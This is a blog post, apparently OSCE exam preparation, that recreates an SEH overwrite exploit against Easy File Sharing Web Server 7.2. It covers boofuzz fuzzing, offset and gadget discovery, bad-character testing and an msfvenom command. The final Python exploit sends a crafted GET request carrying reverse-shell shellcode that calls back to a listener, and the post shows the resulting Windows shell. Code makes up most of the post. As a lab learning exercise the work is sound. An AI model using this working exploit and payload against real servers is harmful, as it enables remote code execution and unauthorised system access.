---
layout: single
title: CTP/OSCE Prep -- Easy File Sharing Web Server 7.2 SEH Overwrite
date: 2019-6-13
classes: wide
header:
  teaser: /assets/images/CTP/immunity.jpg
tags:
  - buffer overflow
  - Windows
  - x86
  - shellcoding
  - exploit development
  - assembly
  - python
  - OSCE
  - CTP
--- 
![](/assets/images/CTP/1920x1080_Wallpaper.jpg)

## Introduction

This series of posts will focus on the concepts I'm learning/practicing in preparation for [CTP/OSCE](https://www.offensive-security.com/information-security-training/cracking-the-perimeter/). In this series of posts, I plan on exploring:
+ fuzzing,
+ vanilla EIP overwrite,
+ SEH overwrite, and
+ egghunters.

Writing these entries will force me to become intimately familiar with these topics, and hopefully you can get something out of them as well! 

This particular post is about recreating an SEH Overwrite from an ExploitDB entry. **IF you've never done an SEH-based overflow, check out my [first post on the topic](https://h0mbre.github.io/SEH_Based_Exploit/#)!**

## Finding a Candidate Exploit

Since I've just about finished all of the Vulnserver exploits and have gone through most of the CTP material, I figured it's time to start getting some experience recreating real world exploits from scratch. I searched for 'SEH' on ExploitDB and settled on the [Easy File Sharing Web Server 7.2](https://www.exploit-db.com/exploits/39008) exploit. I picked this exploit in particular because up to this point I have not done much exploit developement with webservers, most of my experience has come from Vulnserver.  

## Fuzzing

The very first thing I did after downloading and installing the software from [here](http://www.sharing-file.com/) was look for `boofuzz` http fuzzing templates. [The first one I came to](https://github.com/jtpereyda/boofuzz-http) has the following source code: 
```python
#!/usr/bin/env python
# Designed for use with boofuzz v0.0.9
from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("127.0.0.1", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1')
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2')
        s_string('HTTP/1.1', name='HTTP-Version')
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

The first thing I noticed was that the script creates a list of HTTP methods for `boofuzz` to craft packets from, fuzzes the `s_delim` entities `'space-1'` and `'space-2'`, and fuzzes `s_string` entities `'Request-URI'` and `'HTTP-Version'`. `boofuzz` does not fuzz `s_static` entities. 

As you can probably gather, this isn't a super in-depth fuzzing script but it's a great start. It's going to test several HTTP methods and it's going to fuzz about 4 values. Other standard HTTP request fields (such as User Agent) will not be fuzzed, but we can save that for another time.

After a round of fuzzing, the application crashes relatively quickly and as you can see from the screenshot, we notice EAX has been overwritten with `C` values. 

![](/assets/images/CTP/efscrash1.JPG)

Looking through the payloads sent in the `boofuzz-results` folder, the only payload I could find mention of with `C` values was a 512 byte payload sent in the following format: `GET (C*n) `. This led me to believe that the field responsible for the crash was the value after the space in the `GET` request which in our case was the `'Request-URI'` `s_string` entity (`/index.html`). 

![](/assets/images/CTP/boofuzzresults.JPG)

It was pretty frustrating not seeing any reference to larger payloads sent by `boofuzz` in the results folder but at least I was able to sort of piece together the format that led to the crash. Terminal output payloads were as large as 100k bytes. I decided to set all of the other fuzzable entities in our `boofuzz` script to `fuzzable = False` to test my half-baked theory. So now our `boofuzz` script looks like this: 
```python
#!/usr/bin/python

from boofuzz import *


def main():
    session = Session(
        target=Target(
            connection=SocketConnection("192.168.1.201", 80, proto='tcp')
        ),
    )

    s_initialize(name="Request")
    with s_block("Request-Line"):
        s_group("Method", ['GET', 'HEAD', 'POST', 'PUT', 'DELETE', 'CONNECT', 'OPTIONS', 'TRACE'])
        s_delim(" ", name='space-1', fuzzable = False)
        s_string("/index.html", name='Request-URI')
        s_delim(" ", name='space-2', fuzzable = False)
        s_string('HTTP/1.1', name='HTTP-Version', fuzzable = False)
        s_static("\r\n", name="Request-Line-CRLF")
    s_static("\r\n", "Request-CRLF")

    session.connect(s_get("Request"))

    session.fuzz()


if __name__ == "__main__":
    main()
```

Again we get a crash and EAX is overwritten with `C` values. So we know for certain the `'Request-URI'` entity is vulnerable. Time to create a skeleton and recreate the crash. 

![](/assets/images/CTP/efscrash2.JPG)

## Skeleton Exploit

The first thing I did at this point was google for 'http skeleton exploits' and came across this [github repo](https://github.com/HanseSecure/ExploitDev/tree/master/poc) which included an http exploit skeleton. After modifying it slightly to fit my personal taste and our vulnerability analysis up to this point, our skeleton looks like this:
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

crash = "A" * 5000


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

(Notice that we took out the `'\n'` after the `'GET'` in our exploit code and replaced it with a space.)

Sending this payload crashes the server once more and we see that EAX has been overwritten with `A` values, we are in business!

![](/assets/images/CTP/efsskeleton.JPG)

## SEH Overwrite

Checking out the SEH Chain in Immunity shows us that we have overwritten both 4 byte components of the SEH. 

![](/assets/images/CTP/efsSEHchain.JPG)

After using `!mona pc 5000` and placing the resulting address in our SEH entry into `!mona po`, mona tells us that our SEH overwrite occurs after 4061 bytes. 

What we need now is the location of a `POP POP RET` gadget in this application so that we can place it in our current SEH 4 byte space and we can work our way 4 bytes backwards into the 4 byte space that typically holds the pointer to the next SEH. 

Using the `!mona seh` command, most of the addresses we see immediately start with `00` which is not ideal since this will require us to include a null byte in our shellcode. We could try for a partial overwrite but instead, I kept looking for a more friendly 4 byte address and eventually found one at the following location in the `seh.txt` file that mona creates. 

![](/assets/images/CTP/sehlocation.JPG)

Our exploit code now looks like this. Notice that I added the `nseh` parameter (I used `\xcc` but you can use `\x90` as well) so that our math stays correct and we keep getting a consistent SEH overwrite. 
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

nseh = "\xcc" * 4

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

crash = "A" * 4061
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

Let's set a breakpoint on our `POP POP RET` address like so: 

![](/assets/images/CTP/efsbreak.JPG)

And then we can step through it and make sure we end up in our `\xcc` buffer that we created. 

![](/assets/images/CTP/stepthrough.gif)

Perfect, we land in our `\xcc` buffer as expected. We also have a huge amount of space in our `D` buffer to play with. This is looking like a case where we just need to jump over our existing current SEH handler code (`\x99\xab\x01\x10`), and land in our `D` buffer where can stuff some shellcode. 

To do this, I used our favorite Net Jump that we used previously in the series and made `nseh = '\x74\x06\x75\x04'`. This will jump if the Zero Flag is set or if the Zero Flag is not set, since it can only be one or the other, we are guaranteed to jump. We could've used a simple `'\xeb\x06\x90\x90'` value for `nseh` but this is less cool imo. :)

After executing this, we take our jump and land in our `D` buffer. 

This is where things got a little sketchy. 

## Badcharacters Abound

Up until now, we've really only used a handful of characters: `\x41` for our `A` values, `\x44` for our `D` values, `\x99\xab\x01\x10` for `seh`, and `\x74\x06\x75\x04` for `nseh`, so we were nowhere close to out of the woods on character restrictions.

When I put shellcode in our `D` buffer, I didn't receive a callback to my netcat listener so I figured there were some badcharacters. I then tried to test for badcharacters the standard way and had some success by:
+ sending my payload and crashing the application, 
+ right-clicking on ESP and then selecting 'Follow in Dump', 
+ scrolling down until the `A` buffer ended and my bytearray of badchars appeared,
+ seeing which characters were corrupted and removing them one by one. 

The exploit looked like this about midway through my testing: 
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

'''
nseh = "\x74\x06\x75\x04"

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

crash = "A" * 4061
crash += nseh
crash += seh
crash += "D" * (5000 - len(crash))
'''

badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2c\x2d\x2e\x2f\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

crash = 'A' * 4500
crash += badchars
crash += 'D' * (5000 - len(crash))


buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

I ended up determining that badcharacters for this particular application were: `\x00\x20\x25\x2b\x2f\x5c`

## End Game

At this point, I was feeling pretty confident that our shellcode could now be generated and used the following msfvenom command: `msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.208 LPORT=443 -f c -b '\x00\x20\x25\x2b\x2f\x5c'`

Our final exploit code now looks like this:
```python
import socket
import os
import sys

ip = "192.168.1.201"
port = 80

#Net Jump
nseh = "\x74\x06\x75\x04"

#POP POP RET 0x1001ab99
seh = '\x99\xab\x01\x10'

#msfvenom -p windows/shell_reverse_tcp EXITFUNC=thread LHOST=192.168.1.208 LPORT=443 -f c -b '\x00\x20\x25\x2b\x2f\x5c'
#351 bytes
shellcode = ("\xb8\x74\x9a\x9e\xe1\xd9\xe8\xd9\x74\x24\xf4\x5b\x31\xc9\xb1"
"\x52\x31\x43\x12\x03\x43\x12\x83\x9f\x66\x7c\x14\xa3\x7f\x03"
"\xd7\x5b\x80\x64\x51\xbe\xb1\xa4\x05\xcb\xe2\x14\x4d\x99\x0e"
"\xde\x03\x09\x84\x92\x8b\x3e\x2d\x18\xea\x71\xae\x31\xce\x10"
"\x2c\x48\x03\xf2\x0d\x83\x56\xf3\x4a\xfe\x9b\xa1\x03\x74\x09"
"\x55\x27\xc0\x92\xde\x7b\xc4\x92\x03\xcb\xe7\xb3\x92\x47\xbe"
"\x13\x15\x8b\xca\x1d\x0d\xc8\xf7\xd4\xa6\x3a\x83\xe6\x6e\x73"
"\x6c\x44\x4f\xbb\x9f\x94\x88\x7c\x40\xe3\xe0\x7e\xfd\xf4\x37"
"\xfc\xd9\x71\xa3\xa6\xaa\x22\x0f\x56\x7e\xb4\xc4\x54\xcb\xb2"
"\x82\x78\xca\x17\xb9\x85\x47\x96\x6d\x0c\x13\xbd\xa9\x54\xc7"
"\xdc\xe8\x30\xa6\xe1\xea\x9a\x17\x44\x61\x36\x43\xf5\x28\x5f"
"\xa0\x34\xd2\x9f\xae\x4f\xa1\xad\x71\xe4\x2d\x9e\xfa\x22\xaa"
"\xe1\xd0\x93\x24\x1c\xdb\xe3\x6d\xdb\x8f\xb3\x05\xca\xaf\x5f"
"\xd5\xf3\x65\xcf\x85\x5b\xd6\xb0\x75\x1c\x86\x58\x9f\x93\xf9"
"\x79\xa0\x79\x92\x10\x5b\xea\x5d\x4c\x62\x3a\x35\x8f\x64\xbb"
"\x7d\x06\x82\xd1\x91\x4f\x1d\x4e\x0b\xca\xd5\xef\xd4\xc0\x90"
"\x30\x5e\xe7\x65\xfe\x97\x82\x75\x97\x57\xd9\x27\x3e\x67\xf7"
"\x4f\xdc\xfa\x9c\x8f\xab\xe6\x0a\xd8\xfc\xd9\x42\x8c\x10\x43"
"\xfd\xb2\xe8\x15\xc6\x76\x37\xe6\xc9\x77\xba\x52\xee\x67\x02"
"\x5a\xaa\xd3\xda\x0d\x64\x8d\x9c\xe7\xc6\x67\x77\x5b\x81\xef"
"\x0e\x97\x12\x69\x0f\xf2\xe4\x95\xbe\xab\xb0\xaa\x0f\x3c\x35"
"\xd3\x6d\xdc\xba\x0e\x36\xfc\x58\x9a\x43\x95\xc4\x4f\xee\xf8"
"\xf6\xba\x2d\x05\x75\x4e\xce\xf2\x65\x3b\xcb\xbf\x21\xd0\xa1"
"\xd0\xc7\xd6\x16\xd0\xcd")

crash = "A" * 4061
crash += nseh
crash += seh
crash += shellcode
crash += "D" * (5000 - len(crash))
'''
#\x20\x25\x2b\x2f\x5c
badchars = ("\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f"
"\x21\x22\x23\x24\x26\x27\x28\x29\x2a\x2c\x2d\x2e\x30\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f"
"\x40\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5d\x5e\x5f"
"\x60\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f"
"\x80\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f"
"\xa0\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf"
"\xc0\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf"
"\xe0\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff")

crash = 'A' * 4500
crash += badchars
crash += 'D' * (5000 - len(crash))
'''

buffer="GET "
buffer+=crash
buffer+=" HTTP/1.1\r\n"

expl = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
expl.connect((ip, port))
expl.send(buffer)
expl.close()
```

And we receive our reverse shell!
```terminal_session
root@kali:~/# nc -lvp 443                                            
listening on [any] 443 ...
connect to [192.168.1.208] from IEWIN7.fios-router.home [192.168.1.201] 49202
Microsoft Windows [Version 6.1.7601]
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\IEUser\Desktop>
```

## Conclusion

All in all, a pretty standard SEH overwrite with some extensive badcharacter testing. The badcharacters were making the application misbehave and the first time I ran through the exploit I was having trouble finding a process that reliably found bad characters, but it seems that sticking to the traditional way of checking for bad characters served us pretty well this time through. We just had to be thorough. It was fun to recreate an ExploitDB exploit from scratch, we will continue this until test time! Thanks for reading!


## Resources

+ [Exploit DB Entry for Easy File Sharing Webserver](https://www.exploit-db.com/exploits/39008)
+ [EFS Download](http://www.sharing-file.com/)
+ [HTTP Exploit Skeleton](https://github.com/HanseSecure/ExploitDev/blob/master/poc/http.py)
+ [Boofuzz HTTP Template](https://stackoverflow.com/questions/45355344/http-fuzzing-with-boofuzz)
